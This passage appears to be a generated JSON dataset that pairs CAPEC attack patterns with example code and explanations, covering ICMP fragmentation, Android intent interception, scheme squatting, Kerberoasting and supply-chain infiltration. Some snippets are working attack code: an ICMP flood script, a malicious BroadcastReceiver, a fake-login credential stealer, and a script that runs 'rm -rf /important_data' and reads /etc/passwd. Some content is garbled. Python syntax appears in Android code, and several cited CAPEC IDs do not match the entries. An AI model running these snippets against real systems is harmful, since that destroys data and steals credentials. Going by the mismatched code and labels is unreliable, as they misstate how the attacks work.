        "description": "This Python code snippet demonstrates a UDP Fragmentation attack. The `generate_large_packet` function creates a large UDP packet of a specified size, which is larger than the typical MTU (1500 bytes) to force fragmentation. The `send_fragmented_packets` function sends a specified number of these large packets to a target IP and port, causing the target server to consume resources in processing and reassembling the fragmented packets. This attack can lead to resource exhaustion, such as bandwidth and CPU, on the target server. The code embodies the main idea of the CAPEC by illustrating how an attacker can exploit the lack of resource limits (CWE-770) and insufficient control of network message volume (CWE-406) to perform a UDP Fragmentation attack."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import socket\n\n# Function to create a fragmented ICMP packet\ndef create_fragmented_icmp_packet(fragment_size):\n    icmp_header = b'\\x08\\x00'  # ICMP Echo Request\n    payload = b'A' * fragment_size\n    return icmp_header + payload\n\n# Function to send fragmented ICMP packets\ndef send_fragmented_icmp(target_ip, fragment_size, num_fragments):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    for _ in range(num_fragments):\n        packet = create_fragmented_icmp_packet(fragment_size)\n        sock.sendto(packet, (target_ip, 1))\n    sock.close()\n\n# Target IP and parameters\nTARGET_IP = '192.168.1.1'\nFRAGMENT_SIZE = 1480  # Fragment size\nNUM_FRAGMENTS = 10000  # Number of fragments to send\n\n# Send fragmented ICMP packets to the target\nsend_fragmented_icmp(TARGET_IP, FRAGMENT_SIZE, NUM_FRAGMENTS)",
        "description": "This Python code snippet demonstrates a basic ICMP Fragmentation attack. The `create_fragmented_icmp_packet` function generates a fragmented ICMP packet with a specified fragment size. The `send_fragmented_icmp` function sends a large number of these fragmented packets to a target IP address. The parameters `TARGET_IP`, `FRAGMENT_SIZE`, and `NUM_FRAGMENTS` define the target IP address, the size of each fragment, and the number of fragments to send, respectively. This attack can overwhelm the target's resources, potentially causing it to become non-responsive. The code embodies CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of fragments sent, leading to resource exhaustion."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import os\n\n# CWE-73: External Control of File Name or Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-426: Untrusted Search Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef find_sensitive_files(base_path):\n    sensitive_files = ['config.json', 'secrets.txt', 'access_control_list.acl']\n    discovered_files = []\n\n    for root, dirs, files in os.walk(base_path):\n        for file in files:\n            if file in sensitive_files:\n                file_path = os.path.join(root, file)\n                discovered_files.append(file_path)\n                print(f\"Discovered sensitive file: {file_path}\")\n\n    return discovered_files\n\n# Example usage\nbase_path = input(\"Enter the base path to search for sensitive files: \")\ndiscovered_files = find_sensitive_files(base_path)\nprint(f\"Total sensitive files discovered: {len(discovered_files)}\")",
        "description": "This Python code snippet demonstrates a file discovery process that searches for sensitive files within a given directory path. The function `find_sensitive_files` takes a base path as input and looks for specific sensitive files such as 'config.json', 'secrets.txt', and 'access_control_list.acl'. If any of these files are found, their paths are printed and added to a list of discovered files. This code embodies the main idea of the CAPEC 'File Discovery' by probing for key files that may contain critical configuration and security parameters. The code also highlights several related CWEs: CWE-73 (External Control of File Name or Path) by allowing user input to control the search path, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive file paths, CWE-529 (Exposure of Access Control List Files to an Unauthorized Control Sphere) by searching for access control list files, CWE-426 (Untrusted Search Path) by using an externally-supplied search path, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by relying on specific file names to identify sensitive files."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import os\nimport shutil\n\n# Simulate sensitive information\nsensitive_info = 'User Password: 12345'\n\n# Save sensitive information to a file\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Simulate taking a screenshot of the app\nscreenshot_path = 'screenshot.png'\nshutil.copyfile('sensitive_info.txt', screenshot_path)\n\n# Simulate app going to background and OS taking a screenshot\nos.system('open -a Preview ' + screenshot_path)\n\n# The screenshot is now accessible to unauthorized actors\nprint('Screenshot saved at:', screenshot_path)",
        "description": "This Python code snippet simulates the CAPEC 'Probe iOS Screenshots' by creating a file with sensitive information and then copying it to a screenshot file. The code then simulates the app going to the background by opening the screenshot file, which represents the OS taking a screenshot. This screenshot is now accessible to unauthorized actors, demonstrating CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The code highlights the risk of sensitive information being captured in screenshots when an app is sent to the background."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class MaliciousReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // Log the received intent action\n        Log.d(\"MaliciousReceiver\", \"Received intent: \" + intent.getAction());\n\n        // Extract sensitive data from the intent\n        String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n        Log.d(\"MaliciousReceiver\", \"Sensitive data: \" + sensitiveData);\n\n        // Modify the intent data\n        intent.putExtra(\"sensitive_data\", \"modified_data\");\n\n        // Forward the modified intent to another component\n        context.sendBroadcast(intent);\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        context.registerReceiver(new MaliciousReceiver(), filter);\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious BroadcastReceiver in an Android application that intercepts intents from other applications. The receiver logs the received intent action and extracts sensitive data from the intent. It then modifies the intent data and forwards the modified intent to another component. This code embodies the main idea of the CAPEC 'Android Intent Intercept' by showing how a malicious application can intercept, read, modify, and forward intents from a trusted application. The related CWEs are represented as follows: CWE-925 (Improper Verification of Intent by Broadcast Receiver) is shown by the lack of verification of the intent's source, CWE-927 (Use of Implicit Intent for Sensitive Communication) is demonstrated by the use of implicit intents, and CWE-926 (Improper Export of Android Application Components) is implied by the receiver being able to intercept intents from other applications."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\nclass MyWebViewClient(WebViewClient):\n    def onPageFinished(self, view, url):\n        view.loadUrl(\"javascript:window.AndroidInterface.processHTML(document.getElementsByTagName('html')[0].innerHTML);\")\n\nclass AndroidInterface:\n    def __init__(self, context):\n        self.context = context\n\n    @JavascriptInterface\n    def processHTML(self, html):\n        # Process the HTML content\n        print(html)\n\nwebview = WebView(context)\nwebview.getSettings().setJavaScriptEnabled(True)\nwebview.addJavascriptInterface(AndroidInterface(context), \"AndroidInterface\")\nwebview.setWebViewClient(MyWebViewClient())\nwebview.loadUrl(\"http://example.com\")",
        "description": "This Python code snippet demonstrates a vulnerable WebView implementation in an Android application. The WebView is configured to enable JavaScript and injects a JavaScript interface (`AndroidInterface`) into the web page. The `onPageFinished` method of `MyWebViewClient` injects JavaScript code to extract the HTML content of the loaded page and pass it to the `processHTML` method of the `AndroidInterface`. This setup can be exploited by a malicious application to inject code into the WebView, manipulate the DOM, and access sensitive information. The code embodies the main idea of CAPEC-165 (WebView Injection) and highlights related CWEs such as CWE-749 (Exposed Dangerous Method or Function) and CWE-940 (Improper Verification of Source of a Communication Channel)."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Implicit Intent to launch a trusted activity\n        Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n        startActivity(intent);\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimic the trusted activity's UI\n        // Prompt user to enter sensitive data\n    }\n}",
        "description": "This code snippet demonstrates a vulnerable Android application where an implicit intent is used to launch a trusted activity. The MainActivity class sends an implicit intent to start an activity identified by the action 'com.example.TRUSTED_ACTIVITY'. However, this implicit intent can be intercepted by a malicious application, which can then launch a counterfeit activity (MaliciousActivity) that mimics the trusted activity's user interface. The malicious activity can prompt the user to enter sensitive data, believing they are interacting with the trusted activity. This example embodies the main idea of the CAPEC 'Android Activity Hijack' and highlights related CWEs such as the use of implicit intents for sensitive communication (CWE-927) and improper verification of the communication channel's source (CWE-940)."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.TRUSTED_ACTION\")) {\n            // CWE-284: Improper Access Control\n            String sensitiveData = intent.getStringExtra(\"sensitive_data\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        // CWE-926: Improper Export of Android Application Components\n        filter.addAction(\"com.example.TRUSTED_ACTION\");\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}\n\n// CWE-927: Use of Implicit Intent for Sensitive Communication\nIntent intent = new Intent(\"com.example.TRUSTED_ACTION\");\nintent.putExtra(\"sensitive_data\", \"This is sensitive\");\ncontext.sendBroadcast(intent);",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly verifies intents, leading to potential intent spoofing attacks. The BroadcastReceiver listens for a specific action ('com.example.TRUSTED_ACTION') and logs sensitive data received through the intent. The code does not verify the source of the intent, making it susceptible to malicious intents from unauthorized applications (CWE-925). Additionally, the BroadcastReceiver is registered with a public action, making it accessible to any application (CWE-926). The intent used for communication is implicit, which can be intercepted or spoofed by other applications (CWE-927). This code embodies the main idea of the CAPEC by showing how an adversary can exploit these weaknesses to achieve unauthorized access or data modification."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        webView = (WebView) findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        webView.loadUrl(\"file:///android_asset/index.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses WebView and the addJavascriptInterface API. The WebView is configured to enable JavaScript and expose a Java object ('WebAppInterface') to JavaScript running in the WebView. The 'showToast' method in the 'WebAppInterface' class is annotated with @JavascriptInterface, making it accessible from JavaScript. This setup can be exploited by a malicious web page loaded in the WebView to call the 'showToast' method or any other exposed methods, leading to potential security risks such as improper access control (CWE-284) and exposed dangerous methods (CWE-749)."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import os\nimport sys\n\n# CWE-506: Embedded Malicious Code\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# CWE-285: Improper Authorization\n\ndef impersonate_task(user):\n    try:\n        # CWE-520: Impersonation with elevated privileges\n        os.setuid(user)\n        print(f\"Running task as user: {user}\")\n        # CWE-285: No proper authorization check\n        if user == 0:\n            print(\"Accessing sensitive information...\")\n            # CWE-506: Malicious code to steal sensitive information\n            with open('/etc/passwd', 'r') as f:\n                data = f.read()\n            print(data)\n        else:\n            print(\"Insufficient privileges.\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python3 impersonate.py <user_id>\")\n        sys.exit(1)\n    user_id = int(sys.argv[1])\n    impersonate_task(user_id)\n",
        "description": "This Python code snippet demonstrates a task impersonation attack. The function `impersonate_task` attempts to impersonate a user by changing the process's user ID (CWE-520). If the user ID is 0 (root), it proceeds to access and print sensitive information from the '/etc/passwd' file without proper authorization checks (CWE-285). The code contains embedded malicious behavior to steal sensitive information (CWE-506). This snippet embodies the main idea of CAPEC-233 (Task Impersonation) by showing how an adversary can impersonate a task to gain unauthorized access to sensitive data."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import webbrowser\n\n# Malicious application registering a custom URL scheme\nclass MaliciousApp:\n    def __init__(self):\n        self.scheme = 'targetapp://'\n\n    def handle_url(self, url):\n        if url.startswith(self.scheme):\n            self.display_fake_login()\n\n    def display_fake_login(self):\n        print('Welcome to TargetApp! Please enter your credentials:')\n        username = input('Username: ')\n        password = input('Password: ')\n        self.steal_credentials(username, password)\n\n    def steal_credentials(self, username, password):\n        print(f'Stolen credentials - Username: {username}, Password: {password}')\n\n# Simulating a URL being opened that should be handled by the target application\nmalicious_app = MaliciousApp()\nwebbrowser.open('targetapp://login')\nmalicious_app.handle_url('targetapp://login')",
        "description": "This Python code snippet demonstrates a simplified version of a Scheme Squatting attack. The malicious application registers a custom URL scheme ('targetapp://') intended for a target application. When a URL with this scheme is opened, the malicious application handles it and displays a fake login screen, tricking the user into entering their credentials. The credentials are then stolen and printed out. This example embodies the main idea of the CAPEC by showing how a malicious app can intercept and mimic a target app to steal sensitive information. The code also touches on related CWEs, such as CWE-939 (Improper Authorization in Handler for Custom URL Scheme) and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import tkinter as tk\n\nclass MaliciousApp:\n    def __init__(self, root):\n        self.root = root\n        self.root.geometry('300x200')\n        self.root.title('Innocent App')\n\n        # Transparent overlay button\n        self.overlay_button = tk.Button(self.root, text='', command=self.malicious_action)\n        self.overlay_button.place(x=50, y=50, width=200, height=100)\n        self.overlay_button.lift()\n        self.overlay_button.config(bg='white', activebackground='white', relief='flat')\n        self.overlay_button.config(highlightthickness=0, bd=0)\n\n        # Visible button to mislead the user\n        self.visible_button = tk.Button(self.root, text='Click Me!', command=self.fake_action)\n        self.visible_button.place(x=50, y=50, width=200, height=100)\n\n    def malicious_action(self):\n        print('Malicious action executed!')\n\n    def fake_action(self):\n        print('Fake action executed!')\n\nif __name__ == '__main__':\n    root = tk.Tk()\n    app = MaliciousApp(root)\n    root.mainloop()",
        "description": "This Python code snippet demonstrates a simple example of a tapjacking attack using the Tkinter library to create a GUI application. The main idea is to overlay a transparent button (self.overlay_button) on top of a visible button (self.visible_button). The user sees the visible button with the text 'Click Me!' and is misled into clicking it, but the click is actually intercepted by the transparent overlay button, triggering the malicious_action method instead of the fake_action method. This represents the concept of tapjacking, where an attacker overlays one screen on top of another to mislead the user into interacting with a malicious interface. The code also touches on CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not properly restricting the overlay button, allowing it to intercept user interactions intended for the visible button."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import os\n\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\n# CWE-1263: Improper Physical Access Control\n\n# Sensitive information\nsensitive_data = 'SuperSecretPassword123'\n\n# Store sensitive information in a file without proper access control\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Expose system information\nsystem_info = os.uname()\nprint(f'System Info: {system_info}')\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# Simulate a process that could be observed through physical side channels\nfor i in range(1000000):\n    pass  # Simulate some processing",
        "description": "This Python code snippet demonstrates several vulnerabilities related to physical theft and improper handling of sensitive information. The code stores sensitive data ('SuperSecretPassword123') in a file ('sensitive_info.txt') without any access control mechanisms, making it easily accessible to anyone with physical access to the system (CWE-922, CWE-921). It also prints system-level information (CWE-497), which could be exploited by an unauthorized actor. Additionally, the code simulates a process that could be observed through physical side channels (CWE-1300), such as power consumption or electromagnetic emissions, potentially exposing sensitive information. The overall idea is to highlight how physical access to a system can lead to various security vulnerabilities."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import getpass\n\n# Simulate a login process where sensitive information is exposed\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# Simulate a shoulder surfing vulnerability by printing sensitive information\nprint(f'Username: {username}')\nprint(f'Password: {password}')  # CWE-200, CWE-359, CWE-319\n\n# Simulate cleartext transmission of sensitive information\ntransmission_data = f'{username}:{password}'\nprint(f'Transmitting data: {transmission_data}')  # CWE-319\n\n# Simulate exposure of sensitive system information\nsystem_info = 'OS: Linux, Version: 5.4.0-42-generic'\nprint(f'System Info: {system_info}')  # CWE-497",
        "description": "This Python code snippet simulates a scenario where sensitive information is exposed, embodying the concept of a shoulder surfing attack. The code prompts the user to enter a username and password, which are then printed to the console, representing a situation where an unauthorized actor could observe this information (CWE-200, CWE-359). Additionally, the code simulates the cleartext transmission of sensitive information (CWE-319) and the exposure of sensitive system information (CWE-497). This demonstrates how sensitive data can be inadvertently exposed to unauthorized actors, aligning with the main idea of the CAPEC."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import subprocess\nimport os\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n\n# Simulate requesting a Kerberos ticket for a service account\nservice_account = 'service_account@domain.com'\npassword = 'weakpassword'  # CWE-521: Weak Password Requirements\n\n# Requesting a Kerberos ticket (simulated)\ncommand = f'kinit {service_account}'\nprocess = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\nprocess.communicate(input=password.encode())\n\n# Simulate extracting the ticket and saving it to disk\n# CWE-522: Insufficiently Protected Credentials\nticket_file = '/tmp/krb5cc_1000'\nos.system(f'cp /tmp/krb5cc_1000 {ticket_file}')\n\n# Simulate brute-forcing the ticket (not implemented for brevity)\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\nprint(f'Ticket saved to {ticket_file}. Ready for brute-forcing.')",
        "description": "This Python code snippet simulates the process of Kerberoasting, where an attacker requests a Kerberos ticket for a service account, extracts the ticket, and saves it to disk for brute-forcing. The code highlights several security weaknesses: weak password requirements (CWE-521), insufficiently protected credentials (CWE-522), and the use of single-factor authentication (CWE-308). The code does not implement the brute-forcing step but sets up the scenario for it. The main idea is to demonstrate how an attacker can exploit Kerberos authentication to obtain and potentially crack service account credentials."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import requests\n\n# Malicious application leveraging a trusted user's session\nclass MaliciousApp:\n    def __init__(self, session_token):\n        self.session_token = session_token\n        self.saas_url = 'https://saas.example.com/api/'\n\n    def perform_malicious_action(self):\n        headers = {\n            'Authorization': f'Bearer {self.session_token}'\n        }\n        # Exploiting the trusted session to perform unauthorized actions\n        response = requests.post(f'{self.saas_url}delete_user', headers=headers, json={'user_id': '12345'})\n        if response.status_code == 200:\n            print('Malicious action performed successfully')\n        else:\n            print('Failed to perform malicious action')\n\n# Example usage\n# Assume the session_token is obtained from a trusted user's session\nsession_token = 'trusted_user_session_token'\nmalicious_app = MaliciousApp(session_token)\nmalicious_app.perform_malicious_action()",
        "description": "This Python code snippet demonstrates a malicious application that leverages a trusted user's session token to perform unauthorized actions against a SaaS application. The `MaliciousApp` class takes a session token (representing a trusted user's authenticated session) and uses it to send a request to delete a user via the SaaS application's API. The code highlights the vulnerability described in the CAPEC, where an adversary exploits the implicit trust placed on an authenticated session to perform actions at the trusted user's privilege level. The related CWEs are represented by the lack of proper origin validation (CWE-346), incorrect authorization checks (CWE-863, CWE-285), and reliance on client-side enforcement of security (CWE-602)."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport shutil\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\nDEBUG = True\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_data = 'SECRET_API_KEY'\n\nif DEBUG:\n    print(f'Debugging mode: Sensitive data is {sensitive_data}')\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\nuploaded_file_path = '/tmp/malicious_script.py'\n\n# Simulate the upload of a dangerous file\nwith open(uploaded_file_path, 'w') as f:\n    f.write('import os\\nos.system(\"rm -rf /important_data\")')\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Malicious code that exfiltrates sensitive data\ndef exfiltrate_data():\n    with open('/etc/passwd', 'r') as f:\n        data = f.read()\n    # Simulate sending data to an attacker\n    print(f'Exfiltrating data: {data}')\n\n# Execute the malicious script\nos.system(f'python3 {uploaded_file_path}')\n\n# Call the exfiltration function\nexfiltrate_data()",
        "description": "This Python code snippet demonstrates a scenario where an attacker infiltrates a software development environment, leveraging multiple vulnerabilities to achieve their goals. The code includes:\n\n1. **CWE-215**: Sensitive information (e.g., an API key) is inserted into debugging code, which is printed when debugging is enabled.\n2. **CWE-200**: Sensitive information is exposed to unauthorized actors through the debugging print statement.\n3. **CWE-434**: A dangerous file (malicious script) is uploaded and written to the filesystem without restriction.\n4. **CWE-506**: The uploaded file contains embedded malicious code that deletes important data.\n5. **CWE-497**: The exfiltration function reads sensitive system information (e.g., `/etc/passwd`) and simulates sending it to an attacker.\n\nThe code represents the main idea of CAPEC-117: 'Infiltration of Software Development Environment', where an attacker gains access to the IDE, implants malware, and exfiltrates/manipulates sensitive data, potentially compromising the supply chain."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import third_party_component\n\nclass Device:\n    def __init__(self):\n        # Dependency on a third-party component with known vulnerabilities (CWE-1395)\n        self.component = third_party_component.load_component()\n        \n        # Reliance on a component that is not updateable (CWE-1329)\n        if not self.component.is_updateable():\n            raise Exception('Component is not updateable')\n        \n        # Reliance on insufficiently trustworthy component (CWE-1357)\n        if not self.component.is_trustworthy():\n            raise Exception('Component is not trustworthy')\n        \n        # Improper protection against voltage and clock glitches (CWE-1247)\n        if not self._has_voltage_clock_protection():\n            raise Exception('Improper protection against voltage and clock glitches')\n        \n        # Exposure of sensitive information caused by shared microarchitectural predictor state (CWE-1423)\n        if self._is_predictor_state_shared():\n            raise Exception('Exposure of sensitive information due to shared predictor state')\n\n    def _has_voltage_clock_protection(self):\n        # Placeholder for actual voltage and clock glitch protection check\n        return False\n\n    def _is_predictor_state_shared(self):\n        # Placeholder for actual shared predictor state check\n        return True\n\n# Simulate the substitution of a malicious hardware component during baselining\ntry:\n    device = Device()\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet simulates the scenario described in the CAPEC 'Hardware Component Substitution During Baselining'. The 'Device' class initializes with a third-party component that may have known vulnerabilities (CWE-1395). It checks if the component is updateable (CWE-1329) and trustworthy (CWE-1357). It also verifies if there is proper protection against voltage and clock glitches (CWE-1247) and if there is a risk of exposing sensitive information due to shared microarchitectural predictor state (CWE-1423). The code raises exceptions if any of these conditions are not met, simulating the potential issues that could arise from substituting a malicious hardware component during the product development phase."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1263: Improper Physical Access Control\n# CWE-1059: Insufficient Technical Documentation\n# CWE-695: Use of Low-Level Functionality\n# CWE-222: Truncation of Security-relevant Information\n\n# Simulate access to sensitive documentation\nsensitive_docs_path = '/path/to/sensitive/docs'\n\n# Check if the user has physical access (simulated by checking file existence)\ndef has_physical_access(user):\n    return os.path.exists(f'{sensitive_docs_path}/{user}_access.txt')\n\n# Simulate altering documentation to circumvent dial-down functionality\n# This function represents an attacker modifying the documentation\n# to bypass restrictions on advanced technology\n\ndef alter_documentation(user):\n    if has_physical_access(user):\n        with open(f'{sensitive_docs_path}/documentation.txt', 'r+') as doc:\n            content = doc.read()\n            # CWE-222: Truncate security-relevant information\n            truncated_content = content[:100]  # Truncate to obscure the source\n            # CWE-695: Use low-level functionality to modify the document\n            doc.seek(0)\n            doc.write(truncated_content + '\\n# Altered to bypass restrictions')\n            doc.truncate()\n        print('Documentation altered successfully.')\n    else:\n        print('Access denied.')\n\n# Example usage\nuser = 'attacker'\nalter_documentation(user)",
        "description": "This Python code snippet simulates an attacker altering sensitive documentation to circumvent dial-down functionality requirements. The code checks if the user has physical access to the sensitive documentation (CWE-1263) by verifying the existence of a specific file. If access is granted, the attacker reads the documentation, truncates it to obscure security-relevant information (CWE-222), and uses low-level file operations (CWE-695) to modify the document, thereby bypassing restrictions on advanced technology. This alteration could expose sensitive information to unauthorized actors (CWE-200) and is facilitated by insufficient technical documentation (CWE-1059)."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "class SystemDocumentation:\n    def __init__(self):\n        self.documentation = {}\n\n    def add_documentation(self, component, description):\n        self.documentation[component] = description\n\n    def alter_documentation(self, component, new_description):\n        if component in self.documentation:\n            self.documentation[component] = new_description\n        else:\n            raise ValueError(\"Component not found in documentation\")\n\n    def get_documentation(self, component):\n        return self.documentation.get(component, \"No documentation available\")\n\n# Example usage\nsystem_docs = SystemDocumentation()\nsystem_docs.add_documentation('ComponentA', 'Handles user authentication securely')\n\n# Attacker alters the documentation\nsystem_docs.alter_documentation('ComponentA', 'Handles user authentication with basic security')\n\n# System engineer retrieves the altered documentation\nprint(system_docs.get_documentation('ComponentA'))",
        "description": "This Python code snippet represents a simplified version of how an attacker might alter system documentation to introduce vulnerabilities. The `SystemDocumentation` class allows adding, altering, and retrieving documentation for system components. An attacker with access to this documentation can change the description of a component (e.g., from 'Handles user authentication securely' to 'Handles user authentication with basic security'), leading to potential security flaws in the system's implementation. This embodies the CAPEC idea of 'Documentation Alteration to Produce Under-performing Systems' and highlights related CWEs such as 'Insufficient Technical Documentation' and 'Exposure of Sensitive System Information to an Unauthorized Control Sphere'."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemComponent:\n    def __init__(self, config):\n        # Insufficient Technical Documentation (CWE-1059)\n        self.config = config  # No detailed documentation on config structure\n        self.state = None\n\n    def initialize(self):\n        # Missing Documentation for Design (CWE-1053)\n        # No clear documentation on initialization process\n        self.state = 'initialized'\n\n    def execute(self, command):\n        # Improper Following of Specification by Caller (CWE-573)\n        if command not in ['start', 'stop', 'restart']:\n            raise ValueError('Invalid command')\n        # Incorrect Provision of Specified Functionality (CWE-684)\n        if command == 'start':\n            self.state = 'running'\n        elif command == 'stop':\n            self.state = 'stopped'\n        elif command == 'restart':\n            self.state = 'restarting'\n        else:\n            self.state = 'unknown'\n\n    def modify_state(self, new_state):\n        # Improper Control of Dynamically-Managed Code Resources (CWE-913)\n        self.state = new_state  # No validation or control over state changes\n\n# Example usage\ncomponent = SystemComponent(config={})\ncomponent.initialize()\ncomponent.execute('start')\ncomponent.modify_state('compromised')  # Malicious alteration\nprint(component.state)",
        "description": "This Python code snippet represents a simplified system component that suffers from several vulnerabilities related to insufficient and missing documentation, improper following of specifications, incorrect functionality, and improper control of dynamically-managed code resources. The `SystemComponent` class lacks detailed documentation on its configuration and initialization process, leading to potential misuse. The `execute` method does not follow proper specifications and can result in incorrect functionality. The `modify_state` method allows unrestricted changes to the component's state, which can be exploited by an attacker to alter the system's behavior maliciously. This embodies the main idea of the CAPEC, where an attacker can exploit these weaknesses to cause errors in system design and take advantage of the deployed system."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "import third_party_component\n\nclass ProductAssembly:\n    def __init__(self):\n        self.components = []\n\n    def add_component(self, component):\n        if self.verify_component(component):\n            self.components.append(component)\n        else:\n            print('Warning: Untrusted component detected!')\n\n    def verify_component(self, component):\n        # Simulate a verification process\n        trusted_components = ['trusted_component_1', 'trusted_component_2']\n        return component in trusted_components\n\n    def assemble_product(self):\n        # Simulate the assembly process\n        for component in self.components:\n            print(f'Assembling with {component}')\n        print('Product assembled successfully')\n\n# Simulate the insertion of a counterfeit component\nassembly = ProductAssembly()\nassembly.add_component('trusted_component_1')\nassembly.add_component('counterfeit_component')\nassembly.assemble_product()",
